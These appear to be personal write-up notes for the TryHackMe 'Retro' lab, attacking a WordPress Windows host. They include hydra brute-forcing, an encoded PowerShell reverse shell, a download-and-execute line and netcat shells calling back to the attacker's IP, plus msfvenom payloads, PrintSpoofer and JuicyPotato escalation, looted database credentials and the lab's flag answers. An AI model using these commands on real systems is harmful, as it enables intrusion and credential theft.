- [ ] PrivEsc
- [ ] Bruteforce Test
- [ ] Meterpreter payload?
- [ ] Juicy Potato
- [ ] SweetPotato
- [ ] LocalPriviledgesuggestor
- [ ] Check users RecycleBin
- [ ] Check his PS/CMD commands
- [ ] Check browser history
- [ ] Check:
	- [ ] https://faetu.github.io/posts/retro/
	- [ ] https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-014
	- [ ] https://medium.com/@theseriallearner/tryhackme-retro-ctf-writeup-d412aea3b0c3
	- [ ] https://chaudhary1337.github.io/p/tryhackme-retro-writeup/
	- [ ] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	- [ ] https://vulmon.com/searchpage?q=microsoft+windows+10+1607+-#:~:text=CVE%2D2017%2D8566,IME%20Elevation%20of%20Privilege%20Vulnerability%22.
	- [ ] https://steflan-security.com/tryhackme-retro-walkthrough/
	- [ ] https://github.com/WindowsExploits/Exploits/tree/master
- [ ] 

## Open Ports:
	- 80  (/Retro) (wordpress)
	- 3389 (RDP) 

IP Mapping since it's wordpress and enforces localhost in the url
```powershell
google-chrome --host-rules="MAP localhost 10.201.18.231" http://localhost:80
```


## Gobustered:
	-/retro
	- retro/wp-login.php
	- retro/xmlrpc.php

```powershell

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -u http://10.201.109.252/retro -o wpfuzzed.log

```

## Creds:
	- OSINT (on the website - author comments):  **wade:parzival**
		- Works on RDP
		- Works on /Retro/wp-login.php
		- Open Ports:

## Bruteforce

```powershell
# wp-login
hydra -l wade -p /usr/share/wordlists 10.201.10.133 http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -V

# RDP login
hydra -l wade -p /usr/share/wordlists 10.201.10.133 rdp

```

### Reverse Shell

```powershell
# Modify plugins or themes
# was able to catch shells using Ivan Sincek PHP Reverese Shell - got it from here:
https://www.revshells.com/

#other ways:
# You can use shell_execute() command.
# For example, use base64_powershell.py tool to generate a powershell payload and add the following it  to a theme or plugin:
shell_exec("powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgAuADEANQAuADEAOQAyACIALAAgADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"); 

$whoami = shell_exec("whoami");
echo "whoami: " . $echo;

# works:
shell_exec("powershell -c \"iex (new-object net.webclient).downloadstring('http://10.6.15.192:8000/Invoke-PowerShellTcp.ps1')\"");
shell_exec('powershell -c "iex (new-object net.webclient).downloadstring(\"http://10.6.15.192:8000/Invoke-PowerShellTcp.ps1\")"');
```
### RDP

```powershell
xfreerdp3 /v:10.201.10.133 /u:Wade /p:parzival +clipboard /dynamic-resolution
```


## PrivEsc

**Methods didn't work**
```powershell
# Tried God Potato - didn't work.
# Tried Incognito - didn't work.

```

**Method ONE:  SeImpersonate token is available (PrintSpoofer32.exe)

```powershell
# connected using Base_64 Powershell:

>>> whoami 
nt authority\iusr

>>> whoami /priv
Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

>>> systeminfo #(to donwload the exploits )
System Type: x64-based PC

# Tried PrintSpoofer:

The PrintSpoofer64.exe didn't work due to missing dlls. 
The PrintSpoofer32.exe worked and gave me a shell with escalated privs:

>>> (Attackbox) rlwrap nc -nlvp 1336
>>> (target) PS C:\Temp> .\PrintSpoofer32.exe -c "C:\Temp\nc64.exe 10.6.15.192 1336 -e cmd" 

>>> (result):
C:\Windows\system32>whoami
nt authority\system
 
```


**Method TWO:  Kernel Exploit (Required RDP)

```powershell 
>>> systeminfo
OS Version: 10.0.14393 N/A Build 14393
# **Version 1607 (OS build 14393)**
# Use
https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213/Binaries
[**CVE-2017-0213**](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip)
#  Cloned Both repos: /home/kali/Tools/Exploits/


# ---------- NOTE --------------
'I tried this with both Reverse Shell from wp-admin (nt authority\iusr), and RDP access (retroweb\wade) - it only works with RDP (retroweb\wade) as it opens a new CMD windows.
# -------------------------------
>>> 

```

**Method THREE: JuciyPotate**
```powershell

#Step 1: Download Juciypotato from here
https://github.com/ohpe/juicy-potato/releases/tag/v0.1

#Move it to the target
# (Attackbox):
cd ~/Tools/Potatos/JuicyPotato
python3 -m http.server

# (target):
cd C:\Temp
iwr -uri "http://10.6.15.192:8000/JuicyPotato.exe" -Outfile "JuicyPotato.exe"

#Also move the msfvenom payload or Netcat to the server
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.6.15.192 lport=1336 -f exe -o msf.exe

# setup the listener on the host:
rlwrap nc -nlvp 1336

# run the juicyPotato

# The format of JuicyPotato is like this:
 JuicyPotato.exe -l <COM_server_listener_port> -p <program_to_execute> -a <arguments> -t <token_type> -c <CLSID>
 
 # -l <COM_server_listener_port>: any unused local port - can be the same port as the payload. but not required to be the same
 # -t token_type:  the type of token to use for the privilege escalation.
	 # -t 1 - Default token type: Works on Windows 10/Server 2016 and newer - Uses BITS service and other modern COM objects
	 # -t 2 - Alternative token type - Works on older Windows versions (Windows 7/8/Server 2012 R2) - Uses different COM objects that work on legacy systems
	 # -t * - Try all(both) token types (recommended first attempt)
	 
# -c CLSID (Class ID) is a globally unique identifier that Windows uses to identify COM (Component Object Model) classes.
	# JuicyPotato exploits COM objects that have special privileges. Each exploitable COM object has its own CLSID
	# Different Windows versions have different COM objects available
	
# pick any CLSID you want from here and according to the target OS:
https://github.com/ohpe/juicy-potato/tree/master/CLSID

#  The command for MSFVENOM PAYLOAD:
.\JP.exe -l 9090 -p msf.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"

# The command for Netcat:
.\JP.exe -l 9090 -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc64.exe -e cmd.exe 10.6.15.192 1336" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 


# IT WORKED!!
```

**METHOD FOUR: Meterpreter getsystem** 

```powershell
# Let's generate a php meterpreter payload
msfvenom -l payloads | grep php
# I tried staged payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.6.15.192 LPORT=1337 -f raw
# added the pyalod to the author page

# (attackbox) - set up the listener
>>> msfconsole
>>> use multi/handler
>>> set LHOST=10.6.15.192
>>> set LPORT=1337
>>> set payload php/meterpreter/reverse_tcp
>>> run 

# browse to author page, and we have a meterpreter php session
# tried getsystem but it didn't work (said to load)
meterpreter > getuid
Server username: IUSR
meterpreter > getsystem
[-] The "getsystem" command requires the "priv" extension to be loaded (run: `load priv`)
meterpreter > load priv
Loading extension priv...
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (php/windows)
[-] The "priv" extension is supported by the following Meterpreter payloads:
[-]   - windows/x64/meterpreter*
[-]   - windows/meterpreter*


# So we need to inject a windows/x64/meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.6.15.192 LPORT=1336 -f exe -o payload.exe

meterpreter > upload payload.exe
[*] Uploading  : /home/kali/thm/retro2/payload.exe -> payload.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): /home/kali/thm/retro2/payload.exe -> payload.exe
[*] Completed  : /home/kali/thm/retro2/payload.exe -> payload.exe


# in another msfconsole session. 
# set up a multi/handler again and run the listener (session2). 

#(session1):
meterpreter > execute -f payload.exe
Process 2468 created.

#(session2):
meterpreter > getuid
Server username: IIS APPPOOL\retro
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


```

**Method FIVE: `CVE-2019-1388` **

```powershell
Had no luck with this one. Seems like there's a bug in the machine that doesn't allow me open the SSL certificate.
More info about it can be found here:
https://muirlandoracle.co.uk/2020/01/06/retro-write-up/

```
## Loot

wp-config:
```powershell
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress567');

/** MySQL database username */
define('DB_USER', 'wordpressuser567');

/** MySQL database password */
define('DB_PASSWORD', 'YSPgW[%C.mQE');

```


# THM Answers

```powershell
User Flag: 3b99fbdc6d430bfb51c72c651a261927
Root Flag: 7958b569565d7bd88d10c6f22d1c4063
```

